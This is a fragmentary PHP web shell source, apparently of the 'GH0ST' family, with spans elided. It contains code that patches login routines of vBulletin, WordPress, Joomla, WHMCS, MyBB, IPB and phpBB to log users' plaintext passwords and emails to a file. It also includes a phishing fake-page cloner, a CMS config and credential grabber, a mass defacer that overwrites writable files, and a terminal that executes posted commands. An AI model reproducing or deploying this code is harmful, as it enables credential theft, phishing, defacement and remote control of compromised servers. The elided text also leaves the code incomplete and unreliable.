$code='$GH0ST_username = strtolower($vbulletin->GPC["vb_login_username"]);$GH0ST_password = $vbulletin->GPC["vb_login_password"];$GH0ST_file = "{saveto_path}";$sql_query = $vbulletin->db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $GH0ST_username . "\'");while($row = $vbulletin->db->fetch_array($sql_query)){if(strlen($GH0ST_password) > 1 AND strlen($GH0ST_username) > 1){$fp1 = @fopen($GH0ST_file, "a+");@fwrite($fp1, $GH0ST_username . \' : \' .  $GH0ST_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($GH0ST_file);$new = array_unique($f);$fp = @fopen($GH0ST_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
...
$code = '$GH0ST_file="{saveto_path}";$fp = fopen($GH0ST_file, "a+");fwrite($fp, $_POST[\'log\']." : ".$_POST[\'pwd\']." (".($user->user_email).")\n");fclose($fp);$f = @file($GH0ST_file);$new = array_unique($f);$fp = @fopen($GH0ST_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
...
$code = '<?php jimport(\'joomla.user.authentication\');$GH0ST_auth = & JAuthentication::getInstance();$GH0ST_data = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$GH0ST_options = array();$GH0ST_response = $GH0ST_auth->authenticate($GH0ST_data, $GH0ST_options);if($GH0ST_response->status == 1){$GH0ST_file="{saveto_path}";$fp=@fopen($GH0ST_file,"a+");@fwrite($fp, $GH0ST_response->username.":".$_POST[\'passwd\']." ( ".$GH0ST_response->email." )\n");@fclose($fp);$f = @file($GH0ST_file);$new = array_unique($f);$fp = @fopen($GH0ST_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
$code = '<?php if(isset($_POST[\'username\']) AND isset($_POST[\'password\']) AND !empty($_POST[\'username\']) AND !empty($_POST[\'password\'])){if($GH0ST_connect=@mysqli_connect($db_host,$db_username,$db_password,$db_name)){$GH0ST_file = "{saveto_path}";$GH0ST_uname = @$_POST[\'username\'];$GH0ST_pw = @$_POST[\'password\'];if(isset($_POST[\'language\'])){$GH0ST_q = "SELECT * FROM tbladmins WHERE `username` = \'$GH0ST_uname\' AND `password` = \'".md5($GH0ST_pw)."\'";$admin = true;}else{$GH0ST_q = "SELECT * FROM tblclients WHERE `email` = \'$GH0ST_uname\'";$admin = false;}$GH0ST_query = mysqli_query($GH0ST_connect, $GH0ST_q);if(mysqli_num_rows($GH0ST_query) > 0 ){$row = mysqli_fetch_array($GH0ST_query);$allow = true;if(!$admin){$__salt = explode(\':\', $row[\'password\']);$__encPW = md5($__salt[1].$_POST[\'password\']).\':\'.$__salt[1];if($row[\'password\'] == $__encPW){$allow = true;$row[\'username\'] = $row[\'email\'];}else{$allow = false;}}if($allow){$fp = @fopen($GH0ST_file, "a+");@fwrite($fp, $row[\'username\'] . \' : \' .  $GH0ST_pw." (" . $row["email"] . ") : ".($admin ? \'is_admin\' : \'is_user\')."\n");@fclose($fp);$f = @file($GH0ST_file);$new = array_unique($f);$fp = @fopen($GH0ST_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);}}}}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
$code = '$GH0ST_q = $db->query("SELECT `email` FROM ".TABLE_PREFIX."users WHERE `username` = \'".$user[\'username\']."\'");$GH0ST_fetch = $db->fetch_array($GH0ST_q);$GH0ST_file = "{saveto_path}";$fp = @fopen($GH0ST_file, "a+");@fwrite($fp, $user[\'username\']." : ". $user[\'password\']." ( ".$GH0ST_fetch[\'email\']." )\n");@fclose($fp);$f = @file($GH0ST_file);$new = array_unique($f);$fp = @fopen($GH0ST_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);';
...
$code = '$GH0ST_q = $this->DB->buildAndFetch(array(\'select\' => \'email\', \'from\' => \'members\', \'where\' => \'name="\'.$username.\'" OR email="\'.$email.\'"\'));$GH0ST_file = "{saveto_path}";$fp = @fopen($GH0ST_file, "a+");@fwrite($fp, $_POST[\'ips_username\'].\' : \'.$_POST[\'ips_password\'].\' ( \'.$GH0ST_q[\'email\'].\' )\'."\n");@fclose($fp);$f = @file($GH0ST_file);$new = array_unique($f);$fp = @fopen($GH0ST_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
...
$code = '$GH0ST_u = request_var(\'username\', \'\');$GH0ST_p = request_var(\'password\', \'\');if($GH0ST_u != \'\' AND $GH0ST_p != \'\'){$GH0ST_response = $auth->login($GH0ST_u,$GH0ST_p);if($GH0ST_response[\'status\'] == LOGIN_SUCCESS){$GH0ST_file ="{saveto_path}";$fp = @fopen($GH0ST_file, "a+");@fwrite($fp, $GH0ST_u." : ".$GH0ST_p. " ( ".$GH0ST_response[\'user_row\'][\'user_email\']." )\n");@fclose($fp);$f = @file($GH0ST_file);$new = array_unique($f);$fp = @fopen($GH0ST_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
$find = 'case \'login\':';
$code=str_replace('{saveto_path}',$saveto,$code);
$login=$path."/ucp.php";
$evil_login = "\t".$find."\n\t".$code;
...
function GH0ST_StrSearcher($dir,$string,$ext,$e,$arr=array()){
if(@is_dir($dir)){
$files=@scandir($dir);
...
GH0ST_StrSearcher($path,$string,$ext,$e,$results);
$results[] = $path;
}}}}
function GH0STfakepage(){
	GH0SThead();
	GH0STNum(9,10);
	echo '<div class=header><br>
	...
	$clone_page = $_POST['GH0ST1'];
	$fake_root = $_POST['GH0ST2'];
	$logto = $_POST['GH0ST4'];
	$panel = $_POST['GH0ST5'];
	$inject_to = $_POST['GH0ST6'];
	$bind_on = $_POST['GH0ST7'];
	$count = $_POST['GH0ST8'];
	if(!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST['GH0ST3'] == '>>'){
		echo __pre();
		$target = $clone_page;
		$curl = new GH0STCURL();
		...
		if(!empty($source_page)){
			...
			if(!empty($matched_form)){
				...
				$cookie_name = "GH0ST_fakepage_counter" . rand(9999,99999);
...
function GH0STarchive_manager(){
	...
	if($_POST['GH0ST5']=='>>'){
		...
		__GH0ST_open_archive_file($file, $rand_id);
		echo '</div>';
	}
	echo '</div>';
	GH0STfooter();
}
function __GH0ST_open_archive_file($arch, $base_id=0){
	try{
		$files = array();
		$dirs = array();
		$archive = new PharData($arch);
		 ...
		 function __GH0ST_open_archive_usort($a, $b){
			 return strcmp(strtolower($a['name']), strtolower($b['name']))*1;
		 }
		 usort($dirs, "__GH0ST_open_archive_usort");
		 usort($files, "__GH0ST_open_archive_usort");
		 $files = array_merge($dirs, $files);
		 ...
		 echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" fname=".." onclick="GH0STOpenArchive(this);" path="'.dirname($arch.'.php').'">'.$icon.'<span class="archive-name archive-type-dir">| .. |</span></a><td>dir</td><td>-</td><td>-</td></tr>';
		 foreach($files as $file){
			 $icon = '<img class="archive-icons" src="'.findicon($file['name'],$file['type']).'" width="30" height="30">';
			 if($file["type"] == "dir"){
			 	echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" onclick="GH0STOpenArchive(this);" path="'.$file["path"].'" fname="'.$file["name"].'">'.$icon.'<span class="archive-name archive-type-dir">| '.$file["name"].' |</span></a><td>dir</td><td>'.$file["modify"].'</td><td>-</td></tr>';
		 	}else{
				echo "<tr><th><a base_id='".$base_id."' class='archive-file-row' onclick=\"editor('".$file["path"]."','auto','','','','file');\">".$icon."<span class='archive-name archive-type-file' fname='".$file["name"]."'>".$file["name"]."</span></a><td>".GH0STSize($file["size"])."</td><td>".$file["modify"]."</td><td>-</td></tr>";
...
function GH0STopen_archive_dir(){
	$dir = $_POST["GH0ST1"];
	$base_id = $_POST["GH0ST2"];
	__GH0ST_open_archive_file($dir, $base_id);
}
function GH0STconfig_grabber(){
	GH0SThead();
	...
	if($_POST['GH0ST5']=='>>'){
		echo __pre();
		GH0ST_ConfigGrabber($dir, $ext);
	}
	echo '</div>';
	GH0STfooter();
}
function GH0ST_ConfigGrabber($dir, $ext) {
...
if(isset($_POST['GH0ST1'])&&$_POST['GH0ST1']=='file'){
...
<div class="txtfont">
Method: <select style="width: 18%;" onclick="GH0ST_searcher_tool(this.value);" name="method"><option value="files">Find All Writable Files</option><option value="dirs">Find All Writable Dirs</option><option value="all">Find All Readable And Writable Files</option></select>
...
GH0ST_Searcher($dir,trim($ext),$method);
}
}
if($_POST['GH0ST1']=='str'){
...
$string = $_POST['GH0ST3'];
$ext = $_POST['GH0ST5'];
if(!empty($string) AND !empty($dir) AND $_POST['GH0ST4'] == '>>'){
echo __pre();
GH0ST_StrSearcher($dir,$string,$ext,$_POST['GH0ST6']);
}
}
echo '</div>';
GH0STfooter();
}
function GH0STMassDefacer(){
GH0SThead();
GH0STNum(5,6,7,8,9,10);
...
if(@is_dir($newfile)){
GH0ST_ReadDir($newfile,$method,$defpage);
}else{
if(!@is_writable($newfile))continue;
if(!@is_readable($newfile))continue;
GH0ST_Rewriter($newfile,$file,$defpage,$method);
}
}
closedir($dh);
...
function GH0ST_ReadDir($dir,$method='',$defpage=''){
...
if($file == '..' || $file == '.')continue;
$newfile=$dir.'/'.$file;
if(@is_readable($newfile)&&@is_dir($newfile))GH0ST_ReadDir($newfile,$method,$defpage);
if(@is_file($newfile)){
if(!@is_readable($newfile))continue;
GH0ST_Rewriter($newfile,$file,$defpage,$method);
}
...
function GH0ST_Rewriter($dir,$file,$defpage,$m='index'){
...
function GH0ST_Create_A_Tag($action,$vals){
$nulls = array();
...
function GH0ST_Searcher($dir, $ext, $method) {
if(@is_readable($dir)){
if($method == 'all')$ext = '*';
if($method == 'dirs')$ext = '*';
$globFiles = @glob("$dir/*.$ext");
...
function GH0STiFrameCreator($f,$width='100%',$height='600px'){
return('<iframe src="'.__GH0ST_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class GH0STCURL {
public $headers;
public $user_agent;
...
$this->path = GH0ST_TEMPDIR.'/GH0ST_cookies.txt';
...
if (_GH0ST_file_exists($cookie_file,false)) {
...
function GH0STterminalExec(){
	...
	$current_path = '';
	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['GH0ST1'], $match)){
		if(empty($match[1])){
			$match[1] = $match[2];
		}
		$current_path = GH0STEx("cd ".addslashes($match[1]).$seperator.$pwd);
		$current_path = str_replace("\\", "/", $current_path);
	}
	$out = GH0STEx($cmd.$_POST['GH0ST1'], true);
...
function GH0STdoActions(){
	...
	if(isset($_POST['GH0ST1']))$_POST['GH0ST1'] = rawurldecode($_POST['GH0ST1']);
	if(isset($_POST['GH0ST2']))$_POST['GH0ST2'] = rawurldecode($_POST['GH0ST2']);
	$action = $_POST["GH0ST3"];
	...
	if($action == "rename" || $action == "move"){
		...
		$_POST['GH0ST1'] = trim($_POST['GH0ST1']);
		$GH0ST1_escape = addslashes($_POST["GH0ST1"]);
		if($_POST["GH0ST3"] == "rename"){
			$_POST['GH0ST2'] = basename($_POST['GH0ST2']);
		}
		if(!empty($_POST['GH0ST2'])){
			$cmd_rename = false;
			if($chdir_fals&&$GH0ST_canruncmd){
				if(_GH0ST_is_writable($_POST['GH0ST1'])){
					$cmd_rename = true;
					$GH0ST1_escape = addslashes($GH0ST1_decoded);
					GH0STEx("cd '".addslashes($_POST['c'])."';mv '".$GH0ST1_escape."' '".addslashes($_POST['GH0ST2'])."'");
				}
			}
			if(!file_exists($_POST['GH0ST2'])){
				if(@rename($_POST['GH0ST1'], $_POST['GH0ST2'])||$cmd_rename){
					echo "done";
				}else{
					echo "no";
				}
		...
		if(is_dir($_POST["GH0ST1"])){
			$dir = str_replace('//', '/', $_POST["GH0ST1"]);
			$dir = explode('/', $dir);
			...
			$name = basename($_POST["GH0ST1"]);
		}
		$dir = dirname($_POST["GH0ST1"]);
		if($dir == "."){
			$dir = $_POST["c"]."/";
		}
		if(is_file($_POST["GH0ST1"])){
			@copy($_POST["GH0ST1"], $_POST["GH0ST2"]);
			echo("done");
		}elseif(is_dir($_POST["GH0ST1"])){
			if(!is_dir($_POST["GH0ST2"])){
				mkdir($_POST["GH0ST2"], 0755, true);
			}
			copy_paste($dir, $name , $_POST["GH0ST2"] . "/");
			echo("done");
		}
	}elseif($action == "modify"){
		if( !empty($_POST['GH0ST1']) ) {
			$time = strtotime($_POST['GH0ST1']);
			if($time){
				$touched = false;
				if($chdir_fals&&$GH0ST_canruncmd){
					GH0STEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['GH0ST1']))."' '".addslashes($_POST['GH0ST2'])."'");
					$touched = true;
				}
				if(!@touch($_POST['GH0ST2'],$time,$time)&&!$touched){
					echo 'no';
				}else{
					echo 'ok';
				}
...
function GH0STGetConfig(){
$cms = $_POST['GH0ST1'];
$path = trim($_POST['GH0ST2']);
$config = array(
...
if($cms == "drupal"){
	...
	$file=$path.$file;
	if(@is_file($file)||_GH0ST_is_dir($file,"-e")){
	}else{
		$cms = 'drupal2';
	}
}
...
if(@is_dir($path)||_GH0ST_is_dir($path)){
$file=$path.$file;
}elseif(@is_file($path)||_GH0ST_is_dir($path,"-e")){
$file=$path;
}else{
return false;
}
...
if(empty($_POST['a']))
if(isset($default_action) && function_exists('GH0ST' . $default_action))
$_POST['a'] = $default_action;
else
$_POST['a'] = 'FilesMan2';//'FilesMan';
if(!empty($_POST['a']) && function_exists('GH0ST' . $_POST['a']))
call_user_func('GH0ST' . $_POST['a']);
exit;
/*
